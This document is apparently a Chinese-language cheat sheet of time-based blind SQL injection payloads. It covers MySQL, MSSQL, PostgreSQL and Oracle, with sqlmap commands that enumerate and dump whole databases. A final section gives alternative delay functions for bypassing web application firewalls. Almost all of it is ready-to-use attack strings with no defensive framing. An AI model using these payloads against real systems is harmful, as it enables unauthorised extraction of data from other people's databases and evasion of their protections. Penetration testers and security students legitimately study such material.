# 时间盲注 (Time-based Blind SQL Injection)

## 1. MySQL时间盲注

### 确认时间盲注

```sql
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND BENCHMARK(5000000,SHA1('test'))--
```

### 获取数据库名长度

```sql
' AND IF(LENGTH(database())=N,SLEEP(5),0)--
```

### 逐字符提取

```sql
' AND IF(ASCII(SUBSTRING(database(),1,1))>97,SLEEP(5),0)--
' AND IF(ASCII(SUBSTRING(database(),1,1))=100,SLEEP(5),0)--
```

### 使用sqlmap

```bash
sqlmap -u "http://target?id=1" --technique=T --dbs
sqlmap -u "http://target?id=1" --technique=T --dump
```

---

## 2. MSSQL时间盲注

```sql
' AND WAITFOR DELAY '0:0:5'--
' AND IF(1=1) WAITFOR DELAY '0:0:5'--
'; WAITFOR DELAY '0:0:5'--
```

---

## 3. PostgreSQL时间盲注

```sql
' AND pg_sleep(5)--
' AND (SELECT pg_sleep(5))--
' AND (CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
```

---

## 4. Oracle时间盲注

```sql
' AND DBMS_LOCK.SLEEP(5)--
' AND (SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ELSE 0 END FROM DUAL)=0--
```

---

## 5. 绕过WAF

### 替代函数

```sql
' AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)--
' AND GET_LOCK('test',5)--
' AND (SELECT 1 FROM (SELECT SLEEP(5))a--
```
